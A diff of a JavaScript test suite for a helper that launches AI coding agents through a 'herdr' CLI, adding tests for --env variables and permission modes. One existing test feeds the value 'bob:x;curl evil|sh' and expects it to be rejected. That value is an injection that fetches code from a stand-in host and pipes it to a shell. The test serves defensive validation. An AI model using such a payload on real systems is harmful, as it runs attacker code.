@@ -402,7 +402,8 @@ describe('agentCmd', () => {
     const { run, calls } = runner();
     const out = h.agentCmd(['codex', 'jay', '--workspace', 'wR', '--cwd', '/wt/x'], { run });
     expect(out).toEqual({
-      handle: 'jay', kind: 'codex', model: 'gpt-6.1-sol', effort: null, pane_id: 'wR:p2', tab: 'wR:t2',
+      handle: 'jay', kind: 'codex', model: 'gpt-6.1-sol', effort: null,
+      mode: null, sandbox: null, approval: null, env: [], pane_id: 'wR:p2', tab: 'wR:t2',
     });
     expect(calls).toEqual([
       ['herdr', 'agent', 'list'],
@@ -440,6 +441,29 @@ describe('agentCmd', () => {
         '--', '-m', 'ollama/qwen2.5:7b']);
   });
 
+  test('repeatable --env reaches tab create; the result reports keys and permission settings', () => {
+    const { run, calls } = runner();
+    const out = h.agentCmd(['claude', 'sly:mode=dontAsk', '--env', 'BEADS_ACTOR=sly',
+      '--workspace', 'wR', '--cwd', '/wt/x', '--env', 'CLAUDE_CONFIG_DIR=/p'], { run });
+    expect(calls).toContainEqual(['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x',
+      '--label', 'sly ◆', '--no-focus', '--env', 'BEADS_ACTOR=sly', '--env', 'CLAUDE_CONFIG_DIR=/p']);
+    expect(calls).toContainEqual(['herdr', 'agent', 'start', 'sly', '--kind', 'claude', '--pane', 'wR:p2',
+      '--timeout', '45000', '--', '--model', 'claude-opus-5-5', '--permission-mode', 'dontAsk']);
+    expect(out).toMatchObject({
+      mode: 'dontAsk', sandbox: null, approval: null, env: ['BEADS_ACTOR', 'CLAUDE_CONFIG_DIR'],
+    });
+  });
+  test('a bad --env or refused selector is rejected before any herdr call', () => {
+    const { run, calls } = runner();
+    expect(() => h.agentCmd(['claude', 'sly', '--workspace', 'wR', '--cwd', '/wt/x', '--env', 'BAD KEY=x'], { run }))
+      .toThrow(/not shell-style/);
+    expect(() => h.agentCmd(['claude', 'sly', '--workspace', 'wR', '--cwd', '/wt/x', '--env'], { run }))
+      .toThrow(/missing value for --env/);
+    expect(() => h.agentCmd(['codex', 'jay:mode=dontAsk', '--workspace', 'wR', '--cwd', '/wt/x'], { run }))
+      .toThrow(/codex cannot set mode/);
+    expect(calls).toEqual([]);
+  });
+
   test('opencode agent with an unsafe model is rejected before any herdr call', () => {
     const { run, calls } = runner();
     expect(() => h.agentCmd(['opencode', 'bob:x;curl evil|sh', '--workspace', 'wR', '--cwd', '/wt/x'], { run }))
@@ -454,7 +478,8 @@ describe('agentCmd', () => {
     const out = h.agentCmd(['claude', 'nell:model=opus,effort=high',
       '--workspace', 'wR', '--cwd', '/wt/x'], { run });
     expect(out).toEqual({
-      handle: 'nell', kind: 'claude', model: 'opus', effort: 'high', pane_id: 'wR:p2', tab: 'wR:t2',
+      handle: 'nell', kind: 'claude', model: 'opus', effort: 'high',
+      mode: null, sandbox: null, approval: null, env: [], pane_id: 'wR:p2', tab: 'wR:t2',
     });
     expect(calls).toContainEqual(
       ['herdr', 'agent', 'start', 'nell', '--kind', 'claude', '--pane', 'wR:p2', '--timeout', '45000',
